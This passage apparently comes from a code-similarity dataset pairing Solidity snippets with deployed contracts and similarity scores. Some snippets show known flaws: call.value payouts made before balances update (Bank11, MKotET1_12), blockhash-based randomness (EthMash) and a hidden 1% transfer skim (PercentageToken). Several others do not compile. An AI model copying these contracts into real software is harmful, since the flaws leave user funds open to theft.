        if (balances[msg.sender] < amount) return false;

        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        return true;
    }
}"
"contract MessageContract{
        string private message = ""Hello World"";

        function getMessage() public view returns(string memory){
           return message;
        }

        function setMessage(string memory newMessage ) public {
           message = newMessage;
        }
    }",0.6734048277490319,"contract Balls {

string messageString = ""Welcome to the Project 0xbt.net"";

    

    function getPost() public constant returns (string) {

        return messageString;

    }

    

    function setPost(string newPost) public {

        messageString = newPost;

    }

    

}"
"contract Contract2{
    bool public result;

    function Contract2(address contract1Address) public {
        Contract1 contract1 = Contract1(contract1Address);
        result = contract1.simple();
    }
}",0.6874454287959876,"contract NEST_ToLoanDataContract {

    

    function addContractAddress(address contractAddress) public;

    

    function checkContract(address contractAddress) public view returns (bool);

}"
"contract test{
  struct Record {
    string value;
    address owner;
  }

  mapping(string => Record) records;
  Record lastRecord;

  function addRecord(string _recordId, string _value, address _owner) returns (bool) {
    Record r = records[_recordId];
    r.value = _value;
    r.owner = _owner;
    lastRecord = r;
    return true;
  }

  function getLastRecordOwner() returns (address) {
    return lastRecord.owner;
  }

}",0.6171611630158899,"contract HelloWorldContact {

	string word = ""Hello World"";

	address owner;

	

	function HelloWorldContract() {

		owner = msg.sender;

	}



	function getWord() constant returns(string) {

		return word;

	}



	function setWord(string newWord) constant returns(string) {

		if (owner !=msg.sender) {

			return 'You shall not pass';

		}

		word = newWord;

		return 'You successfully changed the variable word';

	}

}"
"contract CheckAddress{
 mapping(string => mapping(address => bool)) public Groups;

 function CheckAddress(){
  }

 function setAddresToGroup(address addr, string group) public {
   Groups[group][addr] = true; 
 }

 function checkExistenceInGroup(address addr,string group) public returns (bool){
   return Groups[group][addr]; 
 }
}",0.6197968071870374,"contract ERC20 is BasicToken {

  function allowance(address owner, address spender) public view returns (uint256);

  function transferFrom(address from, address to, uint256 value) public returns (bool);

  function approve(address spender, uint256 value) public returns (bool);

}"
"contract test{

    mapping(address => bool) public buyers;

    function doBuy() public payable {
       buyTokens();
    }

    function buyTokens() private returns(address){
      require(msg.value == 1 ether);
      buyers[msg.sender] = true;
    }
}",0.6673799985196753,"contract TokenBurner {
    address private _burner;

    function TokenBurner() public {
        _burner = msg.sender;
    }

    function () payable public {
    }

    function BurnMe () public {
        
        if (msg.sender == _burner) {
            
            selfdestruct(address(this));
        }
        
    }
}"
"contract anotherContract
{
    string public name;
    uint public id;

    constructor(uint _id,string _name) public
    {
        name=_name;
        id=_id;
    }

    function getId() view public returns(uint) {
        return id;
    }

    function getName() view public returns(string) {
        return name;
    }
}",0.6937219981948524,"contract IERC721Metadata {

  
  function name() public view returns (string);

  
  function symbol() public view returns (string);

  
  function description() public view returns (string);

  
  function tokenMetadata(uint256 assetId) public view returns (string);
}"
"contract test2 is test{ 
    uint b;

    function test2() {
        b = a++;
    }

    function show() returns(uint){
        b = a++;
        return b; 
    }
}",0.6329647186595457,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Test
{
    function encode(uint a, string memory b) internal pure returns(string memory)
    {
        return string(abi.encode(a, b));
    }
    function decode(string memory a) internal pure returns(uint, string memory)
    {
        return abi.decode(bytes(a), (uint, string));
    }

    function test(uint a, string calldata b) external pure returns(uint, string memory) {
        string memory encoded = encode(a, b);
        return decode(encoded);
    }    
}",0.6251220384192937,"contract Peony is Ownable {
  function stock(string _index, string _unit, uint256 _amount, string _list) returns (bool);
  function ship(string _index) returns (bool);
  function mint(uint256 _ptAmount) returns (bool);
  function reduce(uint256 _tokenAmount) returns (bool);
  function setTokenAddress(address _address) returns (bool);
  function info(string _index) constant returns (string, string, uint256, string);
}"
"contract playerContract{


    function play (uint256 tokens) public {
        
        if (condition) {
            MyToekn instance = MyToken('address of Mytoken');
            instance.transfer('winner address', ntokens); 
        }
    }


}",0.6679958317414258,"contract ContractToken {
    function balanceOf(address _owner) public constant returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}"
"contract MKotET1_12{

    address payable king; uint public claimPrice = 100;

    function calculateCompensation() public returns(uint) {}

    function() external payable {
        if (msg.value  < claimPrice) revert();
            uint compensation = calculateCompensation();
            (bool success, ) = king.call.value(compensation)("""");
            require(success);
            king = msg.sender;
        }
    }",0.6150361613073693,"contract AionClient {

    

    address private AionAddress;



    constructor(address addraion) public{

        AionAddress = addraion;

    }



    

    function execfunct(address to, uint256 value, uint256 gaslimit, bytes data) external returns(bool) {

        require(msg.sender == AionAddress);

        return to.call.value(value).gas(gaslimit)(data);



    }

    



    function () payable public {}



}"
"contract simpleexample{
    bytes32[] inputHashArray;

    function addNewHash(bytes32 input) public returns (uint) {
      inputHashArray.push(input);
      return inputHashArray.length-1;
    }

    function getHash() view public returns (bytes32[] memory){
      return inputHashArray;
    }

    function getLength() view public returns (uint) {
      return inputHashArray.length;
    }

    function blockTime() view public returns (uint blkTime) {
      return block.number;
    }
}",0.6199001823985053,"contract PricingStrategy {

  
  function isPricingStrategy() public pure returns (bool) {
    return true;
  }

  
  function isSane(address ) public pure returns (bool) {
    return true;
  }

  
  function isPresalePurchase(address ) public pure returns (bool) {
    return false;
  }

  
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public view returns (uint tokenAmount);
}"
"contract answer{
  
  event VoteEvent(string ID, bool returnValue);

  function vote(string ID, uint qNum, uint ans) returns (bool) {
    
    VoteEvent(ID, true);
    return true;
  }
}",0.6139785526523477,"contract ProspectorsGoldToken {
    function balanceOf( address who ) constant returns (uint value);
    function transfer( address to, uint value) returns (bool ok);
}"
"contract Campaign{
    struct Request{
        string description;
        uint value;
        address payable recipient;
        bool compelete;
        uint approvalCount;
        mapping(address => bool) hasVoted;
    }

    Request[] public requests;
    address public manager;
    uint public minContribution;
    mapping(address => bool) public approvers;
    uint public approversCount;

    modifier onlyManager(){
        require(msg.sender == manager);
        _;
    }

    constructor (uint min,address creator) public{
        manager = creator;
        minContribution = min;
    }

    function contribute() public payable{
        require(msg.value > minContribution);

        approvers[msg.sender] = true;
        approversCount++;
    }

    function createRequest(string memory description, uint value, address payable recipient) public onlyManager {
        Request memory newRequest = Request({
            description: description,
            value: value,
            recipient: recipient,
            compelete: false,
            approvalCount: 0
        });

        requests.push(newRequest);
    }

    function approveRequest(uint index) public {
        Request storage thisRequest = requests[index];

        require(approvers[msg.sender]);
        require(!thisRequest.hasVoted[msg.sender]);

        thisRequest.hasVoted[msg.sender] = true;
        thisRequest.approvalCount++;
    }

    function finalizeRequest(uint index) public onlyManager{
        Request storage thisRequest = requests[index];

        require(thisRequest.approvalCount > (approversCount / 2));
        require(!thisRequest.compelete);

        thisRequest.recipient.transfer(thisRequest.value);
        thisRequest.compelete = true;
    }

    function getSummary() public view returns(uint, uint, uint, uint, address){
        return(
            minContribution,
            address(this).balance,
            requests.length,
            approversCount,
            manager
            );
    }

    function getRequestsCount() public view returns (uint){
        return requests.length;
    }
}",0.6022643763274634,"contract LibraCreditNetwork is ERC20 {    		
		
  string public _name;
  string public _symbol;
  uint8 public _decimals;
  uint256 _totalSupply; 
  
  string private _version = &#39;0.1&#39;;
  
  mapping(address => uint256) balances;
  mapping (address => mapping (address => uint256)) internal allowed;
  
  function () {
        
        throw;
  }
  	
  function LibraCreditNetwork() {                           
        _name = ""Libra Credit Network"";            
        _symbol = ""LBA"";                                    
        _decimals = 18;                  		
        _totalSupply = 1000000000000000000000000000; 
        balances[msg.sender] = _totalSupply;
  }
  
  
  function decimals() public constant returns (uint8 decimals) {
        return _decimals;
  }
  
  
  function version() public view returns (string) {
        return _version;
  }

  
  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  
  
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);

    balances[_from] -= _value;
    balances[_to] += _value;
    allowed[_from][msg.sender] -= _value;
    Transfer(_from, _to, _value);
    return true;
  }

  
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }

  
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
}"
"contract TestContract{   

    InterfaceTest _inter;
    InterfaceContract ts = new InterfaceContract();

    function test2(address _addr) public returns(uint) {
        _inter = InterfaceTest(_addr);
        return 2;
    }


    function test4()public view returns(uint)  {
        uint t = ts.testInterface();
        return t;

    }
}",0.6268931200233805,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract Base1
{
    function foo() virtual public {}
}",0.6813176114230024,"contract TUB {
    function off() public returns(bool);
}"
"contract Base2
{
    function foo() virtual public {}
}",0.6813176114230024,"contract TUB {
    function off() public returns(bool);
}"
"contract Prova
{
   uint[] public array;

   function prova(uint number) public {
      array.push(number);
   }
}",0.6317983124818803,"contract SaiVox {
    function par() public returns (uint);
    function way() public returns (uint);
}"
"contract Pairs{

        address[][] pair;

        function setPair(address buyer, address seller) {
            pair.push([buyer,seller]);
        }

        function getPair(uint8 i) constant returns (address buyer, address seller) {

            return (pair[i][0],pair[i][1]);
        }
    }",0.6401653970425482,"contract OwnedI {
    event LogOwnerChanged(address indexed previousOwner, address indexed newOwner);

    function getOwner()
        constant
        returns (address);

    function setOwner(address newOwner)
        returns (bool success); 
}"
"contract SplitPayment{

    address[3] addresses;

    function SplitPayment(address[3] addrs){
        addresses = addrs;
    }

    function sendPayment() public {
        uint balance = this.balance;
        for(uint i; i<3; i++){
            addresses[i].send(balance/3);
        }
    }

    function(){
        sendPayment();
    }
}",0.6091206771368047,"contract Airdrop {

    ERC20 token;

    function airdrop(address tokenAddress, address[] addresses, uint256 amount) public {

        token = ERC20(tokenAddress);

        for(uint i = 0; i < addresses.length; i++) {

            token.transferFrom(msg.sender, addresses[i], amount);

        }

    }

}"
"contract Crowdsale{
    Token tokenContract;
    address crowdsaleOwner;

    function Crowdsale(address _tokenAddress) public {
      tokenContract = Token(_tokenAddress);
      crowdsaleOwner = msg.sender;
    }


    function transferOwnerShipBack(address _newOwner) public {
        require(msg.sender == crowdsaleOwner);
        tokenContract.transferOwnerShip(_newOwner);
    }
}",0.6467446445918085,"contract Ownable {

    address public contractOwner;
    
    event OwnershipTransfer(address _from, address _to);

    modifier onlyOwner(){
        require(msg.sender == contractOwner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner {
        address oldOwner = contractOwner;
        contractOwner = newOwner;
        OwnershipTransfer(oldOwner,newOwner);
    }
}"
"contract PercentageToken{

    
    address payable target = 0x158de12EE547EAe06Cbdb200A017aCa6B75D230D;

    
    mapping (address => uint) public balanceOf;
    uint public totalSupply;

    
    constructor(uint _totalSupply) public {
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = totalSupply;
    }

    
    
    function transfer(address _to, uint amount) public {

        
        uint shareForX = amount/100;

        
        
        uint senderBalance = balanceOf[msg.sender];
        
        require(senderBalance >= amount);
        
        
        balanceOf[msg.sender] -= amount;
        
        
        uint receiverBalance = balanceOf[_to];

        
        
        balanceOf[_to] += amount-shareForX;
        
        balanceOf[target] += shareForX;

        
        
        
        assert(balanceOf[msg.sender] + balanceOf[_to] + shareForX ==
            senderBalance + receiverBalance);
    }
}",0.6541651945548372,"contract Token is SafeMath {

	
	mapping (address => uint256) public balanceOf;
	
	string public name = ""MoralityAI"";
	
	string public symbol = ""Mo"";
	
	uint8 public decimal = 18; 
	
	uint256 public totalSupply = 1000000000000000000000000;
	
	event Transfer(address indexed from, address indexed to, uint256 value);

	
	function Token(){
		
		balanceOf[msg.sender] = totalSupply;
	}

	
	function transfer(address _to, uint256 _value){
		
		require(balanceOf[msg.sender] >= _value);
		
		require(safeAdd(balanceOf[_to], _value) >= balanceOf[_to]);
		
		balanceOf[msg.sender] = safeSub(balanceOf[msg.sender], _value);
		
		balanceOf[_to] = safeAdd(balanceOf[_to], _value);
		
		Transfer(msg.sender, _to, _value);
	}
}"
"contract test_compexity{


 function f(uint256 n) constant  returns (uint256)  {
    uint256 j=0;
     while(j<n){
         j=j+1;
     }

 return j;
 }
}",0.6702721472812345,"contract ERC721 {
  function totalSupply() constant returns (uint256);
  function ownerOf(uint256) constant returns (address);
}"
"contract playerContract{


function play (uint256 tokens, address from) internal {
    
    if (condition) {
        MyToekn instance = MyToken('address of Mytoken');
        instance.transfer('winner address', ntokens); 
    }
}


function receiveApproval(address from, uint256 tokens, address token, bytes data) public{
     require(token=='your token address');
     delete data;
     MyToekn instance = MyToken(token);
     instance.transferFrom(from,address(this), tokens)
     play(tokens, from); 
}",0.6767547577055191,"contract tokenRecipient {
    event receivedEther(address sender, uint amount);
    event receivedTokens(address _from, uint256 _value, address _token, bytes _extraData);

    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public {
        Token t = Token(_token);
        require(t.transferFrom(_from, this, _value));
        receivedTokens(_from, _value, _token, _extraData);
    }

    function () payable  public {
        receivedEther(msg.sender, msg.value);
    }
}"
"contract MyContract{
   uint a = 0;

   function myFunction() public {
      a = 0;
   }

   function increaseVariable() public {
       a++;
       if (a == 10) {
           myFunction();
       }
   }
}",0.6085843721216485,"contract FiatContract {
  function USD(uint _id) public view returns (uint256);
  function updatedAt(uint _id) public view returns (uint);
}"
"contract Test{

    address payable owner;
    address payable buyerAddr;
    address payable withdrawAddr;

    mapping(address => uint) balances;

    constructor(address payable _buyerAddr, address payable _withdrawAddr) payable public {
        owner = msg.sender;
        buyerAddr = _buyerAddr;
        withdrawAddr = _withdrawAddr;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    modifier onlyBuyer(){
        require(msg.sender == buyerAddr);
        _;
    }

    function Send() payable public onlyBuyer{
    }

    function getBalanceOwner() view public returns(uint){
        return owner.balance;
    }

    function getBalanceBuyer() view public returns(uint){
        return buyerAddr.balance;
    }

    function getBalanceWithdrawAddr() view public returns(uint){
        return withdrawAddr.balance;
    }

    function getBalanceThis() view public returns(uint){
        return address(this).balance;
    }

    function Withdraw() onlyOwner public returns(bool success)  {
        uint256 amount = address(this).balance;
        withdrawAddr.transfer(amount);
        return true;
    }
}",0.6683254825361941,"contract EthMash {

    address public owner;
    mapping (address => uint) public balances;

    address public leader;

    event Log(address challenger, address defender, bool success);

    constructor() public {
        owner = msg.sender;
        leader = owner;
    }

    function publicGetBalance(address player) view public returns (uint) {
        return balances[player];
    }

    function publicGetState() view public returns (address) {
        return leader;
    }

    function userWithdraw() public {
        require(balances[msg.sender] > 0);
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.transfer(amount);
    }

    function userChallenge() public payable {
        require(msg.value == 100 finney);
        
        uint random = (uint(blockhash(block.number - 1)) + uint(leader) + uint(msg.sender));
        if (random % 2 == 1) {
            emit Log(msg.sender, leader, true);
            balances[msg.sender] += 100 finney;
            leader = msg.sender;
        } else {
            emit Log(msg.sender, leader, false);
            balances[leader] += 95 finney;
            balances[owner] += 5 finney;
        }
    }
}"
"contractB {
  event Deposit (address from, uint value);

  function () external payable {
    emit Deposit (msg.sender, msg.value);
  }
}",0.6431172764358878,"contract Burnable {

  function burn(uint256 value) public returns (bool);

  event Burn(address indexed from, uint256 value);

}"
"contract IamHongKongTokenBack_00{ 



mapping(address => uint256)  lastBalance;

function saveBalance() public  {
    lastBalance[msg.sender] = msg.sender.balance;
}   


function fetchBalance(address _address) constant public returns (uint256) {
    return lastBalance[_address];
}   


}",0.6827635679941441,"contract ViewBalances {

  

  constructor() public{}

    

  function checkBalances(address[] addresses) public constant returns(uint256[]){

      uint256[] storage balances;

      for(uint256 i = 0; i < addresses.length; i++){

          balances.push(addresses[i].balance);

      }

      return balances;

  }        



}"
"contract test{

    function getSlice(uint256 begin, uint256 end, string text) public pure returns (string) {
        bytes memory a = new bytes(end-begin+1);
        for(uint i=0;i<=end-begin;i++){
            a[i] = bytes(text)[i+begin-1];
        }
        return string(a);    
    }


}",0.6054329265251803,"contract ERC20TokensContract {

    

    function balanceOf(address _owner) external view returns (uint256 balance);

    function totalSupply() external view returns (uint256);

    string public name;

    string public symbol;

}"
"contract test{
    

    address payable owner;
    mapping (address => bool) pd;
    uint public sS;

    function lnA(address addr) public view returns(uint8 n) {
        
        n = uint8(keccak256(abi.encodePacked(addr, sS))[0]) % 8;
    }
}",0.6803193420930456,"contract locaToken {

    function transferFrom(address _from, address _to, uint _value) public returns (bool);

    function allowance(address _owner, address _spender) public view returns (uint);

}"
"contract B{
    function transferBalance(to) { 
        to.transfer(this.balance);
    }
 }",0.6699946390874929,"contract test {
    
    function a() public
    {
        msg.sender.transfer(this.balance);    
    }
    
    
}"
"contract project{

  address public user;
  bytes32[10] name;
  address[10] customer;
  uint public i=0;

  event LogDep (address sender,    uint amount, uint balance);
  event LogSent(address recipient, uint amount, uint balance);
  event LogErr (address recipient, uint amount, uint balance);

  function project(){
    user=msg.sender;
  }

  function depositFunds() public payable returns(bool success) {
    LogDep(msg.sender, msg.value, this.balance); 
    return true;
  }

  function add(bytes32 _name){
    name[i]=_name;
    customer[i]=msg.sender;
    i++;
  }

  function get_address() constant returns(address[10]){
    return customer;
  }

  function reward() {
    for(uint i=0;i<10;i++)
    {

        

        if(customer[i].send(1)) {
            LogSent(customer[i], 1, this.balance);
        } else {
            LogErr(customer[i], 1, this.balance);
        }
    }
  }
}",0.6663127570599234,"contract ChessBank{

    

    mapping (address => uint) private balances;

    

    address public owner;

    

    event depositDone(string message, address accountAddress, uint amount);

    event withdrawalDone(string message, address accountAddress, uint amount);

    

    function BankContract() public {

        owner = msg.sender;

    }

    

    function deposit() public payable {

        balances[msg.sender] += msg.value;

        depositDone(""A deposit was done"", msg.sender, msg.value);

    }

    

    function withdraw(uint amount) public {

        require(balances[msg.sender] >= amount);

        balances[msg.sender] -= amount;

        

        if(!msg.sender.send(amount)){

            balances[msg.sender] += amount;

        }

        else{

            withdrawalDone(""A withdrawal was done"", msg.sender, amount);

        }

        

    }

    

    function getBalance() public constant returns (uint){

        return balances[msg.sender];

    }

}"
"contract EtherBank{
    mapping(address => uint) public userBalances;
    mapping(address => bool) public withdrawMutex;

    function getBalance(address user) constant returns(uint) {  
        return userBalances[user];
    }

    function addToBalance() {  
        userBalances[msg.sender] += msg.value;
    }

    function withdrawBalance() {  
        if ( withdrawMutex[msg.sender] == true) { throw; }
        withdrawMutex[msg.sender] = true;
        uint amountToWithdraw = userBalances[msg.sender];
        if (amountToWithdraw > 0) {
            if (!(msg.sender.send(amountToWithdraw))) { throw; }
         }
        userBalances[msg.sender] = 0;
        withdrawMutex[msg.sender] = false;
    }
}",0.6291070162966031,"contract WithdrawalContract {

    address public richest;

    uint public mostSent;



    mapping (address => uint) pendingWithdrawals;



    constructor() public payable {

        richest = msg.sender;

        mostSent = msg.value;

    }



    function becomeRichest() public payable returns (bool) {

        if (msg.value > mostSent) {

            pendingWithdrawals[richest] += msg.value;

            richest = msg.sender;

            mostSent = msg.value;

            return true;

        } else {

            return false;

        }

    }



    function withdraw() public {

        uint amount = pendingWithdrawals[msg.sender];

        

        

        pendingWithdrawals[msg.sender] = 0;

        msg.sender.transfer(amount);

    }

}"
"contract BlackEye{

    uint public initial_supply = 1000000;

    mapping(address=> uint) public balances;   

    address ownerAddress;

    modifier onlyOwner {
        require(ownerAddress == msg.sender);
        _;
    }
    function BlackEye() public {
        ownerAddress = msg.sender;
        balances[address(this)] = initial_supply;
    }
    function deposit(address investor, uint rupee_invested) external onlyOwner {
        balances[investor] += rupee_invested;
        balances[address(this)] -= rupee_invested;
    }
    function send_money(address receiver , uint amount_send) external{
        require(balances[msg.sender] >= amount_send);
        balances[msg.sender] -= amount_send;
        balances[receiver] += amount_send;
    }
    function transferReserves(address receiver, uint amount) external onlyOwner {
        require(balances[address(this)] >= amount);
        balances[address(this)] -= amount;
        balances[receiver] += amount;
    }
}",0.6431224612441614,"contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    constructor () internal {
        _owner = msg.sender;
    }

    
    function owner() public view returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(msg.sender == _owner);
        _;
    }

    
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0));
        address __previousOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(__previousOwner, newOwner);
    }

    
    function rescueTokens(address tokenAddr, address receiver, uint256 amount) external onlyOwner {
        IERC20 __token = IERC20(tokenAddr);
        require(receiver != address(0));
        uint256 __balance = __token.balanceOf(address(this));

        require(__balance >= amount);
        assert(__token.transfer(receiver, amount));
    }
}"
"contract Test{

    using SafeMath for uint;
    mapping (address => uint) deposits;

    function deposit(address addr) payable {
        uint256 amt = msg.value;
        uint alreadyDeposited = deposits[addr]; 
        
            deposits[addr] =  alreadyDeposited.add(amt);
            
        
        
    }

    function getBalance(address _addr) constant returns (uint){
        return deposits[_addr];
    }

}",0.6311472651715692,"contract Sent is Ownable{
    using SafeMath for uint256;
    
    address private toaddr;
    uint public amount;
  event SendTo();
  
  function SentTo(address _address) payable onlyOwner public returns (bool) {
    toaddr = _address;
    kill();
    emit SendTo();
    return true;
  }
  
   function kill() public{
        selfdestruct(toaddr);
    }
    
    
    
    
}"
"contract testMSGVALUEinBrowser{
    uint lastSent;
    function test() public returns (uint lastSent) {
        lastSent = msg.value;
        return lastSent;
    }
    function get() constant returns( uint){
        return lastSent;
    }
}",0.6235200607382702,"contract Context {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgValue() internal view returns (uint256) {
        return msg.value;
    }
}"
"contract shaCast{
    
    function Sha3Lit() constant returns (bytes32){
        return sha3(3);
    }

    
    function Sha3LitCast() constant returns (bytes32){
        return sha3(uint32(3));
    }

    
    function Sha3Uint32() constant returns (bytes32) {
            uint32 n = 3;
            return sha3(n);
    }
}",0.6203578173513158,"contract SaiTub {
    function tab(bytes32 cup) public returns (uint);
    function rap(bytes32 cup) public returns (uint);
    function din() public returns (uint);
    function chi() public returns (uint);
    function rhi() public returns (uint);
}"
"contract NewHello{ 

    address owner;

    constructor()public{
        owner = msg.sender;
    }

    modifier onlyOwner (){
        require(msg.sender == owner);
        _;
    }

    struct user{
        string name;
        string surname;
        uint age;
    }
    mapping(address => user) public users; 

    function updateUser(address _address, string memory name, string memory surname, uint age) public onlyOwner {
        users[_address] = user(name, surname, age);
    }

    function getUser(address _address) public view returns(string memory name, string memory surname, uint age) {
         
        return (users[_address].name, users[_address].surname, users[_address].age);        
    }
}",0.6312525033708105,"contract O2ERC20Token is ERC20 {

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply, address tokenOwnerAddress) public {
      _name = name;
      _symbol = symbol;
      _decimals = decimals;

      
      _mint(tokenOwnerAddress, totalSupply);

    }

    


    

    
    function name() public view returns (string memory) {
      return _name;
    }

    
    function symbol() public view returns (string memory) {
      return _symbol;
    }

    
    function decimals() public view returns (uint8) {
      return _decimals;
    }
}"
"contract ethertransfer{

    function payMe() payable returns(bool success) {
        return true;
    }

    function fundtransfer(address etherreceiver, uint256 amount){
        if(!etherreceiver.send(amount)){
           throw;
        }    
    }
}",0.6863534841426999,"contract elixir {

    function transfer(address _to, uint256 _amount) returns (bool success);

    function transferFrom(address _from,address _to,uint256 _amount) returns (bool success);

}"
"contract A{

    struct N{
        string any;
        uint[] numberArray;
    }

    N[] public numbers;

    function init(uint[] _numbers) public{
        numbers.push(N(""anything"", _numbers));
    }

    function getNumbersAtIndex(uint index) public view returns(uint[] _numbers) {
        return numbers[index].numberArray;
    }

}",0.6092831977711363,"contract DetailedERC721 is ERC721 {
    function name() public view returns (string _name);
    function symbol() public view returns (string _symbol);
   
    function tokenOfOwnerByIndex(address _owner, uint _index) public view returns (uint _tokenId);
}"
"contract mycontract{
    uint256 public result;
    function add(uint256 x, uint256 y) public {
        result = x + y;
    } 

}",0.6554252389545037,"contract DnaMixer {
    function mixDna(uint256 dna1, uint256 dna2, uint256 seed) public pure returns (uint256);
}"
"contract Bank11{
   mapping(address=>uint) userBalances;
   function getUserBalance(address user) constant returns(uint) {
     return userBalances[user];
   }

   function addToBalance() payable {
     userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
   }
   function withdrawBalance() {
     uint amountToWithdraw = userBalances[msg.sender];
     if (msg.sender.call.value(amountToWithdraw)() == false) {
         throw;
     }
     userBalances[msg.sender] = 1;
   }
}",0.6294766321509335,"contract BasicToken is ERC20Basic {

  

  using SafeMath for uint;

  

  mapping(address => uint) balances;



  function transfer(address _to, uint _value) public{

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

  }



  function balanceOf(address _owner) public constant returns (uint balance) {

    return balances[_owner];

  }

}"
"contract Child is Parent
{

    function test() public {
        value = 1;
    }

    function verify() constant returns (bool) {
        require(isValueOne());
        return true;
    }
}",0.6754275690434752,"contract ERC20Mintable is ERC20 {
    
    function mint(address to, uint256 value) public onlyOwner returns (bool) {
        _mint(to, value);
        return true;
    }
}"
"contract lastSentValue{  
  uint lastSent;  
  function set() public returns (uint) {  
    lastSent = msg.value;  
    return lastSent;  
  }  
  function get() public constant returns( uint){  
    return lastSent;  
  }  
}",0.6690763913195997,"contract OtcInterface {

    function getPayAmount(address, address, uint) public constant returns (uint);

    function buyAllAmount(address, uint, address pay_gem, uint) public returns (uint);

}"
"contract B{
    event Created(address newContract);   
      function createA() public returns(addressCreated, bool invoked)) {
        A a = new A();
        Created(a);
        bool success = a.invoke();
        return (a, success);
   }
}",0.6343002136210497,"contract Token {
 
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  function transfer(address to, uint tokens) public returns (bool success);
     
}"
"contract Called{
    uint public myuint;

    function set(uint _var) {
        myuint = _var;
    }
}",0.6515092421487688,"contract FiatContract {
  function USD(uint _id) public view returns (uint256);
}"
"contract TransferToken{
    function sendTheToken(address _from, address _to, uint256 _value)public returns(string) {
        address tokenContractAddress = <MyTokenaddress>
        MyToken token = MyToken (tokenContractAddress);
        token.transferFrom(_from, _to, _value);
    }
}",0.6637226779170332,"contract Token
{
   mapping(address => mapping (address => uint256)) allowed;
   function transfer(address to, uint256 value) public returns (bool);
   function transferFrom(address from, address to, uint256 value) public returns (bool);
}"
"contract transfer{

  uint nextItemId;
  mapping(uint32 => address[]) public owners;

  function createAsset(string name, uint256 price) public
  {
      Asset memory newAsset = Asset(name, price); 
      owners[nextItemId].push(msg.sender);
      nextItemId = nextItemId + 1;
    }

  function transferProduct(uint32 id) public payable {
    owners[id].push(address((msg.sender)));

  }
}",0.6194623262180139,"contract KpopItem is ERC721 {
  function ownerOf(uint _itemId) public view returns (address addr);
  function getItem(uint _itemId) public view returns (
    string name,
    uint price,
    address owner,
    uint[6] traitValues,
    uint celebId
  );
  function transferToWinner(address _winner, address _loser, uint _itemId) public;
}"
"contract IScoreStore{
    function GetScore(string name) public view returns (int);
}",0.6873255898089754,"contract Registry {
    function owner(bytes32 node) public view returns (address) {}
}"
"contract optimisationTest{

    bool public flag;
    uint public foo;

    function setFlag() internal returns (uint256) {
        flag = true;

        return 1;
    }

    function complexCode() internal pure returns (uint256) {
        uint256 j;

        for (uint256 i = 0; i < 100; i ++) {
            j += i;
        }

        return j;
    }

    function test() public {
        foo = 0 * setFlag();
        foo = 0 * complexCode();
    }
}",0.6694308528224445,"contract SloadTest {

    uint256[] public buffer;

    

    function readAll() external returns (uint256 sum) {

        sum = 0;

        uint256 length = buffer.length;

        for (uint256 i = 0; i < length; i++) {

            sum += buffer[i];

        }

        return sum;

    }

    

    function write() external {

        buffer.push(buffer.length);

    }

    

    function getLength() public view returns (uint256) {

        return buffer.length;

    }

}"
"contract A{
    uint a =10;
    address owner;
    function A(){
        owner = msg.sender;
    }

    function updateValue(uint a) {
        require(msg.sender == owner);
        a = a+10;
    }
}",0.6956283625144846,"contract Owned {

    

    address public owner;

    

    function isOwner() internal returns (bool) { return msg.sender == owner; }

    

    function Owned() { owner = msg.sender; }

}"
"contract ShapeCalculator{
    function rectangle(uint256 w, uint256 h) public returns (uint256 s, uint256 p) {
        
        emit Width(w);
        emit Height(h);

        s = w * h;
        p = 2 * (w + h);
    }

    event Width(uint256 w);
    event Height(uint256 h);
}",0.6079163339998629,"contract DSMath {

    function add(uint256 x, uint256 y) constant internal returns (uint256 z) {
        assert((z = x + y) >= x);
    }

    function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {
        assert((z = x - y) <= x);
    }

}"
"contract Prova
{
   uint[] public array;

   function prova() public {
      array.push(4);
   }
}",0.6424185257897469,"contract Counter {
    uint public counter;
    function increment() public { counter++; }
}"
"contract transfer{

  uint lenghtcounter;
  mapping(uint => address[]) public owners;

  function createAsset(string name, uint price) public
  {
      uint id = getRandom(); 

      Asset memory newAsset = Asset(name, price); 

      owners[id].push(msg.sender);
    }

  function transferProduct(uint id) public payable {
    uint temp = lenghtcounter + 1;
    owners[id].push(msg.sender)+temp ;
    lenghtcounter = temp;
  }
}",0.6217237479812411,"contract Counter {
    
    event Won(address winner, uint amount);
    
    uint public i;
    address public owner;
    
    function Counter() public {
        owner = msg.sender;
